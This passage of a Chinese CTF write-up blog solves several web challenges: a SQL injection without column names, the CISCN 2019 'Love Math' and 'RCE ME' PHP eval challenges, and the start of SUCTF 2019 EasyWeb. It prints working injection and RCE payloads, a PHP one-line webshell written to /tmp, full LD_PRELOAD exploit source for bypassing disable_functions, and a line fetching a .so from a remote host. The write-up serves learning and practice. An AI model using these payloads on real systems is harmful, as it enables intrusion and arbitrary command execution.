<p>此时可以看到列名分别为1,2,3</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215175503.png" alt></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215175614.png" alt></p>
<p>这里可以看到我们通过<code>union</code>连接来改变原来的列名, 所以我们可以通过</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from users)x;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215175808.png" alt></p>
<p>这里有几个注意的点</p>
<ul>
<li><p>列名用反引号, 这里因为是数字, 我们需要使用反引号包起来, 如果不用的话会全部变成2</p>
<p>  <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215175931.png" alt></p>
</li>
<li><p>子<code>select</code>要用<code>()</code>包起来</p>
</li>
<li><p>子<code>select</code>最后要赋予一个别名, 不然会报错</p>
<p>  <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215180027.png" alt></p>
</li>
</ul>
<p>然后我们就可以注入了</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1'union/**/select/**/1,</span><br><span class="line">(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22</span><br></pre></td></tr></tbody></table></figure><p></p>
<blockquote>
<p>我现在才发现<code>select*from users</code>是成立的, 中间不需要用空格….</p>
</blockquote>
<p>然后就可以拿flag了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215181855.png" alt></p>
<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>这道题蛮有意思的, 先看代码</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'c'</span>])){</span><br><span class="line">    show_source(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">    <span class="hljs-comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="hljs-string">'c'</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> (strlen($content) >= <span class="hljs-number">80</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"太长了不会算"</span>);</span><br><span class="line">    }</span><br><span class="line">    $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>];</span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $content)) {</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>, <span class="hljs-string">'base_convert'</span>, <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'dechex'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="hljs-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) {</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">//帮你算出答案</span></span><br><span class="line">    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$content.<span class="hljs-string">';'</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>代码中做了三个判断</p>
<ol>
<li><p>长度必须小于80</p>
</li>
<li><p>过滤一部分符号</p>
<p> </p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'</span><br></pre></td></tr></tbody></table></figure><p></p>
</li>
<li><p>匹配所有函数变量名必须在<code>$whitelist</code>中, 比如<code>pi</code></p>
<p> 这个正则来源可以见 <a href="https://www.php.net/manual/zh/language.variables.basics.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.variables.basics.php</a></p>
</li>
</ol>
<p>其实第一个是最难的hhhh</p>
<p>看一下手册就可以看到, 有个函数很特别</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215234953.png" alt></p>
<p>这个返回值是<code>string</code>就很妙了, 那么我们可以通过这样的方法来转换出我们需要的字符</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$command = <span class="hljs-string">"phpinfo"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> base_convert($command,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);</span><br><span class="line"><span class="hljs-comment"># >:55490343972</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这样就能得到一个纯数字, 然后通过</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(55490343972,10,36)();</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>就可以执行了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215235620.png" alt></p>
<p>然后同理我们可以拼出</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base_convert(1751504350,10,36)(base_convert(784,10,36));</span><br><span class="line"># system(ls)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200215235849.png" alt></p>
<p>但是读文件就比较困难了, <code>base_convert</code>只能转换<code>[a-z0-9]</code>, 而读文件需要空格, 本题的flag在<code>/flag</code>, 那就势必需要能够转换特殊字符的函数了, 这里有两个思路</p>
<h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h3><p>先看一下手册</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216000132.png" alt></p>
<p>这个函数可以实现将Hex转换成字符串, 也就是</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216000338.png" alt></p>
<p>但是这样会出现字母, 本地先转换成10进制, 然后在payload使用<code>dechex</code>转换回去就可以了, 具体操作如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(696468,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))</span><br><span class="line"># system(hex2bin(dechex(1819484207)))</span><br><span class="line"># system('ls /')</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>当然想法很好, 长度却不够了, 这里的替换思路有两个, 一个是将<code>system</code>换成<code>exec</code>, 并更改进制来尽量减少位数, 只要不出现字母就可以了</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(1819484207)))</span><br><span class="line"># exec('ls /')</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>刚好79, 可以执行</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216004303.png" alt></p>
<p>但是没有全部返回hhh, 这里知道是在<code>/flag</code>, 就可以直接打, 不过命令也是比较取巧</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260451114)))</span><br><span class="line"># exec('nl /*')</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216010423.png" alt></p>
<p>另外一种就是构造<code>$_GET</code>, 然后就可以为所欲为了hhhh</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(3761671484,13,36)(dechex(1598506324));$$pi{0}($$pi{1})</span><br><span class="line"># $pi=hex2bin(dechex(1598506324));</span><br><span class="line"># $pi=_GET</span><br><span class="line"># $$pi=$_GET</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>这里利用的是php的可变变量特性</p>
<p>剩下的就显而易见了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216010344.png" alt></p>
<h3 id="从其他位置获取参数"><a href="#从其他位置获取参数" class="headerlink" title="从其他位置获取参数"></a>从其他位置获取参数</h3><p>可以在 <a href="https://xz.aliyun.com/t/4906#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4906#toc-8</a> 中看到ROIS使用的payload是</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</span><br><span class="line"># system(getallheaders(){9})</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>实测的时候一直没有打通, 研究了一下发现这个payload需要在apache环境下</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216002103.png" alt></p>
<p>buu上是用nginx, 所以打不通, 其他的类似函数因为长度问题用不了, 就当了解一下了</p>
<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>参考 <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p>这个过滤的话很明显就能想到p神上面那篇文章, 直接取反就可以绕过了, 然后我们想办法执行, 先看一下<code>phpinfo()</code></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217022540.png" alt></p>
<p>然后是<code>disable_function</code></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>可以看到<code>mail</code>没有被禁, 那么我们待会就可以用来绕过</p>
<p>这里的话我们只能够拼接<code>assert</code>而不能拼接<code>eval</code>, 这是由php的特性决定的</p>
<p>然后看一下环境是在Apache下, 那么有一说一还是<code>getallheaders</code>舒服</p>
<p>参考 <a href="https://evoa.me/index.php/archives/62/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/62/</a></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));</span><br><span class="line"># assert(next(getallheaders()));</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后在<code>User-Agent</code>输入命令即可</p>
<p>为了<code>Bypass disable_function</code>, 先让蚁剑连上来, 写shell</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: print_r(file_put_contents("/tmp/a.php",'<?php eval($_POST[c]);?>'))</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后包含</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: include("/tmp/a.php");</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>蚁剑就可以连上来了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217023757.png" alt></p>
<p>这里先提供一个懒人方法</p>
<p>使用蚁剑的插件</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217023835.png" alt></p>
<p>就可以直接绕过了hhh, 当然我们不能这样, 还是要一步一步来</p>
<p>推荐以下两篇文章</p>
<p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p>
<p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
<blockquote>
<p>无论学什么都能在一叶飘零师傅的文章中找到.jpg</p>
</blockquote>
<p>我们知道如果要加载<code>LD_PRELOAD</code>需要新起进程, 在php解释器运行中, 第一次执行<code>execve</code>是调用php解释器, 如果出现第二个<code>execve</code>就是有新进程的生成, 这里的测试php如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><?php</span><br><span class="line">	mail('','','','');</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后使用命令</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f php test.php 2>&1|grep -C3 execve</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217161437.png" alt></p>
<p>可以看到确实出现了多个<code>execve</code>, 同样的函数还有<code>imap_open</code></p>
<p>这里我就直接使用了前面链接中的文件</p>
<p>首先是<code>exp.c</code></p>
<p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string"><stdlib.h></span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string"><stdio.h></span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string"><string.h></span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-comment">// get command line options and arg</span></span><br><span class="line">    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmdline = getenv(<span class="hljs-string">"EVIL_CMDLINE"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="hljs-comment">// unsetenv("LD_PRELOAD") no effect on some </span></span><br><span class="line">    <span class="hljs-comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="hljs-keyword">int</span> i;</span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">"LD_PRELOAD"</span>)) {</span><br><span class="line">                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">'\0'</span>;</span><br><span class="line">            }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>在linux中编译</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp_x64.so</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>exp.php</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>"</span>;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[<span class="hljs-string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="hljs-string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="hljs-string">" > "</span> . $out_path . <span class="hljs-string">" 2>&1"</span>;</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"<p> <b>cmdline</b>: "</span> . $evil_cmdline . <span class="hljs-string">"</p>"</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="hljs-string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[<span class="hljs-string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="hljs-string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(<span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"<p> <b>output</b>: <br />"</span> . nl2br(file_get_contents($out_path)) . <span class="hljs-string">"</p>"</span>; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>然后通过蚁剑一起上传上去, 带上参数访问即可</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200217192911.png" alt></p>
<p>不用蚁剑的话可以通过开另一台<code>linux_lab</code>来传</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy("http://ip:port/exp.so","/tmp/exp.so");</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>方法很多, 蚁剑是比较方便的方法</p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>源码如下</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="hljs-string">"upload/tmp_"</span>.md5($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="hljs-keyword">if</span>(!file_exists($userdir)){</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">"file"</span>])){</span><br><span class="line">        $tmp_name = $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/ph/i"</span>,$extension)) <span class="hljs-keyword">die</span>(<span class="hljs-string">"^_^"</span>); </span><br><span class="line">        <span class="hljs-keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="hljs-string">'<?'</span>)!==<span class="hljs-keyword">False</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">"^_^"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>(!exif_imagetype($tmp_name)) <span class="hljs-keyword">die</span>(<span class="hljs-string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="hljs-string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="hljs-string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (!$hhh){</span><br><span class="line">    highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(strlen($hhh)><span class="hljs-number">18</span>){</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">'One inch long, one inch strong!'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">'/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="hljs-number">3</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>(strlen($character_type)><span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">eval</span>($hhh);</span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h3><p>首先有长度和正则的过滤, 我们需要先想办法构造一个<code>$_GET</code>出来, fuzz一下特殊符号, 发现还有<code>^</code>, 那大概就是异或来绕过正则了, 而我们在下面还可以看到有个</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$character_type = count_chars($hhh, 3);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200216015942.png" alt></p>
<p>也就是说我们不能使用超过12种字符</p>
<p>那先用脚本构造一下</p>
